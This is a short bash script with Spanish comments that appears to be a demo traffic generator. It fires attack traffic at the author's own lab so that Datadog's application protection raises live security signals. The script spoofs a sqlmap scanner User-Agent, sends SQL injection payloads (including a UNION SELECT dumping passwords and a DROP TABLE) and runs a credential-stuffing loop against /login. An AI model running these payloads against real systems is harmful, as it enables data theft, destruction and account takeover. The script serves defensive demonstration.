#!/usr/bin/env bash
#
# attacker.sh — genera trafico de ataque contra el lab para que Datadog AAP
# dispare senales EN VIVO durante la demo. Solo contra tu propio lab.
#
# Uso:
#   ./attacker.sh http://<host>:8080
#
# Que hace, mapeado al flujo de la demo:
#   1) User-Agent de scanner  -> senal "Security Scanner Detected"
#   2) Payloads de SQLi en ?q  -> senal "SQL Injection Attempt" (regla OWASP)
#   3) Credential stuffing /login -> senal de ATO (gancho a session hijacking)
#
set -euo pipefail

TARGET="${1:-http://localhost:8080}"
SCANNER_UA="sqlmap/1.7 (http://sqlmap.org)"

echo ">> Objetivo: $TARGET"
echo ">> Esto lo esta haciendo 'alguien afuera, ahorita' (simulado desde este script)."
echo

echo "[1/3] Escaneo con User-Agent de scanner..."
for i in $(seq 1 8); do
  curl -s -o /dev/null -A "$SCANNER_UA" "$TARGET/search?q=maria" || true
  sleep 0.3
done

echo "[2/3] Intentos de SQL injection en el parametro q..."
PAYLOADS=(
  "' OR '1'='1"
  "' UNION SELECT username, password, 1 FROM users --"
  "'; DROP TABLE patients; --"
  "' OR 1=1 --"
  "admin' --"
)
for p in "${PAYLOADS[@]}"; do
  curl -s -o /dev/null -G -A "$SCANNER_UA" --data-urlencode "q=$p" "$TARGET/search" || true
  echo "    enviado: $p"
  sleep 0.5
done

echo "[3/3] Credential stuffing contra /login (gancho ATO)..."
for u in jennifer miguel elias admin root; do
  for pw in 123456 password admin qwerty letmein; do
    curl -s -o /dev/null -A "$SCANNER_UA" \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$u\",\"password\":\"$pw\"}" \
      "$TARGET/login" || true
  done
done

echo
echo ">> Listo. Revisa AAP -> Signals en Datadog. Si bloqueaste la IP, corre de nuevo y veras 403."
